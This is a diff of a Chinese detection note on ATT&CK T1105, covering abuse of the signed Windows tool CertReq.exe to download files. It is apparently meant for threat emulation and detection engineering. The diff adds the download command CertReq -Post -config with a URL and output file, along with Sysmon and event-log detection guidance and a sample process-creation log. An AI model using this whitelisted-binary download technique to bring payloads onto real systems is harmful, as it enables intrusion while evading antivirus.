@@ -1,35 +1,73 @@
 # T1105-Win-入口工具转移-CertReq.exe(白名单)
 
-## 来自ATT&CK的描述
+## 描述
 
-攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。
+攻击者利用合法工具`CertReq.exe`从外部系统将工具或恶意文件转移到被攻陷环境（T1105），以实现工具部署或恶意软件分发。`CertReq.exe`是Windows内置组件，设计用于请求证书、检索CA响应或处理证书请求文件。攻击者可通过滥用其`-Post`和`-config`参数，将HTTP POST请求发送至外部URL（如`https://www.baidu.com/`），将响应内容保存为本地文件（如`output.txt`），从而下载恶意文件。由于`CertReq.exe`为白名单程序且由Microsoft签名，易被恶意利用以规避传统防病毒检测。
+
+此技术适用于Windows Vista及以上版本，需用户权限即可执行。检测重点在于监控`CertReq.exe`的异常命令行参数（包含HTTP URL）、网络请求及文件创建行为。
 
 ## 测试案例
 
-CertReq.exe用于从证书颁发机构请求证书 (CA) ，从CA检索对以前的请求的响应，从.inf文件创建新请求，以接受和安装对请求的响应，以从现有CA证书或请求构造交叉认证或限定的次序请求， 并签署交叉认证或限定的下级请求。
+1. **CertReq文件下载**  
+   使用`CertReq.exe`通过HTTP POST从远程URL下载文件，模拟工具转移。  
+2. **配置文件伪造**  
+   利用`win.ini`作为占位符，触发HTTP请求并保存响应。  
 
-**路径:**
-
-```YML
-- C:\Windows\System32\certreq.exe
-- C:\Windows\SysWOW64\certreq.exe
-```
-
-将来自www.baidu.com的HTTP POST的响应内容保存到端点上，输出output.txt在当前目录中。
-
-```YML
-CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
-```
-
-用例：从 Internet 下载文件
-所需权限：用户
-操作系统：Windows Vista、Windows 7、Windows 8、Windows 8.1、Windows 10
+### 示例命令
+- **触发下载**（需用户权限）：
+  ```cmd
+  CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
+  ```
+- **清理**：
+  ```cmd
+  del output.txt
+  ```
 
 ## 检测日志
 
-Windows 安全日志
+**Windows安全日志**  
+- **事件ID 4688**：记录`CertReq.exe`进程创建及命令行参数（若启用）。  
+
+**Sysmon日志**  
+- **事件ID 1**：记录`CertReq.exe`进程创建，捕获命令行参数。  
+- **事件ID 3**：记录网络连接，捕获`CertReq.exe`的HTTP请求（目标IP/端口）。  
+- **事件ID 11**：记录输出文件（如`output.txt`）创建。  
+
+**PowerShell日志**  
+- **事件ID 4104**：记录若通过PowerShell调用`CertReq.exe`的脚本执行。  
+
+**网络日志**  
+- 捕获`CertReq.exe`发起的HTTP POST请求。  
+
+**配置日志记录**  
+- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
+- 启用PowerShell日志：`计算机配置 > 管理模板 > Windows组件 > Windows PowerShell > 启用模块日志和脚本块日志记录`。  
+- 配置Sysmon监控`CertReq.exe`及文件操作：
+  ```xml
+  <RuleGroup name="ProcessCreate" groupRelation="and">
+    <ProcessCreate onmatch="include">
+      <Image condition="end with">certreq.exe</Image>
+    </ProcessCreate>
+  </RuleGroup>
+  <RuleGroup name="FileCreate" groupRelation="and">
+    <FileCreate onmatch="include">
+      <TargetFilename condition="is not">c:\windows\win.ini</TargetFilename>
+    </FileCreate>
+  </RuleGroup>
+  ```
+- 配置IDS/IPS记录HTTP流量。
 
 ## 测试复现
+
+### 环境准备
+- **靶机**：Windows 10/11或Windows Server 2016/2022（支持Vista及以上）。  
+- **权限**：用户权限（无需管理员）。  
+- **工具**：`CertReq.exe`（系统自带，路径`C:\Windows\System32\certreq.exe`或`C:\Windows\SysWOW64\certreq.exe`）、Sysmon、Wireshark、测试Web服务器（如`https://www.baidu.com`）。  
+- **网络**：可控网络环境，允许HTTPS出站流量。  
+- **日志**：启用Windows安全日志、Sysmon日志，配置网络监控。  
+
+### 攻击步骤
+1. **触发下载** 
 
 ```YML
 C:\Users\liyang\Desktop\asptest>CertReq -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
@@ -49,51 +87,24 @@ Set-Cookie: BAIDUID=4305E8F795AE7B64177F5105CD755190:FG=1; expires=Tue, 18-Apr-2
 Vary: Accept-Encoding,User-Agent
 ```
 
+**注意**：测试需在合法授权环境进行，替换URL为测试服务器。
+
 ## 测试留痕
 
 ```YML
 已创建新进程。
-
-  
-
 创建者主题:
-
 安全 ID: DESKTOP-PT656L6\liyang
-
 帐户名: liyang
-
 帐户域: DESKTOP-PT656L6
-
 登录 ID: 0x47126
-
-  
-
-目标主题:
-
-安全 ID: NULL SID
-
-帐户名: -
-
-帐户域: -
-
-登录 ID: 0x0
-
-  
-
 进程信息:
-
 新进程 ID: 0x1778
-
 新进程名称: C:\Windows\System32\certreq.exe
-
 令牌提升类型: %%1938
-
 强制性标签: Mandatory Label\Medium Mandatory Level
-
 创建者进程 ID: 0x24b4
-
 创建者进程名称: C:\Windows\System32\cmd.exe
-
 进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 ```
 
